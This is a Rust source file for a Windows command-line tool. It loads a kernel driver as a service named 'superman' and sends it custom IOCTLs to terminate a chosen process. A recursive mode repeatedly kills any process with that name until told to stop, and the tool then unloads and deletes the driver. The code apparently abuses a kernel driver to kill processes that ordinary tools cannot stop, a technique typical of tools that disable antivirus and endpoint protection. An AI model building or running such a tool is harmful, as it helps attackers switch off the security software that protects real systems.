use crate::args::Args;
use crate::utils::{get_process_name, get_process_pid};
use crate::{DRIVER_PATH, EXIT};
use anyhow::anyhow;
use std::cell::RefCell;
use std::ffi::CStr;
use std::mem::{size_of_val, zeroed};
use std::path::Path;
use std::ptr::{addr_of, addr_of_mut, null, null_mut};
use std::sync::atomic::Ordering::Acquire;
use std::thread::sleep;
use std::time::Duration;
use std::{fs, process};
use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, FALSE, GENERIC_READ, GENERIC_WRITE, INVALID_HANDLE_VALUE,
};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileA, DELETE, FILE_ATTRIBUTE_NORMAL, OPEN_EXISTING,
};
use windows_sys::Win32::System::Services::{
    CloseServiceHandle, ControlService, CreateServiceA, DeleteService, OpenSCManagerA,
    OpenServiceA, StartServiceA, SC_MANAGER_ALL_ACCESS, SC_MANAGER_CREATE_SERVICE,
    SERVICE_CONTROL_STOP, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, SERVICE_KERNEL_DRIVER,
    SERVICE_START, SERVICE_STATUS, SERVICE_STOP,
};
use windows_sys::Win32::System::IO::DeviceIoControl;

const SERVICE_NAME: &CStr = unsafe { CStr::from_bytes_with_nul_unchecked(b"superman\0") };
const INITIALIZE_IOCTL_CODE: u32 = 0x9876C004u32;
const TERMINATE_PROCESS_IOCTL_CODE: u32 = 0x9876C094u32;

/// Load and start driver from path
pub fn load_driver(path: &CStr) -> anyhow::Result<()> {
    unsafe {
        let scm = OpenSCManagerA(null(), null(), SC_MANAGER_CREATE_SERVICE);
        if scm == 0 {
            return Err(anyhow!("[-]OpenSCManagerA failed {}!", GetLastError()));
        }

        let service = CreateServiceA(
            scm,
            SERVICE_NAME.as_ptr().cast(),
            SERVICE_NAME.as_ptr().cast(),
            SERVICE_START | DELETE | SERVICE_STOP,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_IGNORE,
            path.as_ptr().cast(),
            null(),
            null_mut(),
            null(),
            null(),
            null(),
        );

        if service == 0 {
            CloseServiceHandle(scm);
            let err = GetLastError();

            return match err {
                1073 => Ok(()),
                _ => Err(anyhow!("[-]CreateServiceA failed {}!", err)),
            };
        }

        println!("[+]Service created successfully!");

        let res = StartServiceA(service, 0, null());

        // Last use of these service handle
        CloseServiceHandle(scm);
        CloseServiceHandle(service);

        if res == FALSE {
            return Err(anyhow!("[-]StartServiceA failed {}!", GetLastError()));
        }

        println!("[+]Driver loaded successfully!");
    }

    Ok(())
}

/// Unload and delete driver by name
pub fn unload_delete_driver(path: &Path) -> anyhow::Result<()> {
    let mut status: SERVICE_STATUS = unsafe { zeroed() };

    unsafe {
        let scm = OpenSCManagerA(null(), null(), SC_MANAGER_CREATE_SERVICE);
        if scm == 0 {
            return Err(anyhow!("[-]OpenSCManagerA failed {}!", GetLastError()));
        }

        let service = OpenServiceA(scm, SERVICE_NAME.as_ptr().cast(), SC_MANAGER_ALL_ACCESS);
        if service == 0 {
            CloseServiceHandle(scm);
            return Err(anyhow!("[-]OpenServiceA failed {}!", GetLastError()));
        }

        let res = ControlService(service, SERVICE_CONTROL_STOP, addr_of_mut!(status));
        if res == FALSE {
            CloseServiceHandle(scm);
            CloseServiceHandle(service);

            return Err(anyhow!("[-]ControlService failed {}!", GetLastError()));
        }

        let res = DeleteService(service);

        // Last use of these service handle
        CloseServiceHandle(scm);
        CloseServiceHandle(service);

        if res == FALSE {
            return Err(anyhow!("[-]DeleteService failed {}!", GetLastError()));
        }
    }

    fs::remove_file(path).unwrap();

    Ok(())
}

/// Send ioctl to kill pid
pub fn kill_pid(args: Args) -> anyhow::Result<()> {
    let device_name = CStr::from_bytes_with_nul(b"\\\\.\\superman\0")?;
    let pid = args.pid;
    let mut output = 0u64;

    unsafe {
        let device = CreateFileA(
            device_name.as_ptr().cast(),
            GENERIC_READ | GENERIC_WRITE,
            0,
            null(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            0,
        );
        if device == INVALID_HANDLE_VALUE {
            return Err(anyhow!("[-]CreateFileA failed {}!", GetLastError()));
        }

        // DeviceIoControl function
        let device_io_control = RefCell::new(|control_code: u32, pid: u32| {
            let res = DeviceIoControl(
                device,
                control_code,
                addr_of!(pid).cast(),
                u32::try_from(size_of_val(&pid))?,
                addr_of_mut!(output).cast(),
                u32::try_from(size_of_val(&output))?,
                null_mut(),
                null_mut(),
            );
            if res == FALSE {
                CloseHandle(device);
                return Err(anyhow!("[-]DeviceIoControl failed {}!", GetLastError()));
            }

            Ok(())
        });

        let kill = |pid| {
            match device_io_control.borrow_mut()(TERMINATE_PROCESS_IOCTL_CODE, pid) {
                Ok(_) => println!("[+]Process {} has been terminated!", pid),
                Err(e) => eprintln!("{}", e),
            };
        };

        // Init driver
        device_io_control.borrow_mut()(INITIALIZE_IOCTL_CODE, pid)?;
        println!("[+]Driver initialized {:#x}!", INITIALIZE_IOCTL_CODE);

        if args.recursive {
            let name = get_process_name(pid);

            loop {
                // exit
                if EXIT.load(Acquire) {
                    CloseHandle(device);
                    unload_delete_driver(DRIVER_PATH.get().unwrap()).unwrap();
                    process::exit(0i32);
                }

                if let Some(pid) = get_process_pid(&name) {
                    kill(pid);
                }

                sleep(Duration::from_millis(args.time));
            }
        }

        kill(pid);
        CloseHandle(device);
    }

    Ok(())
}
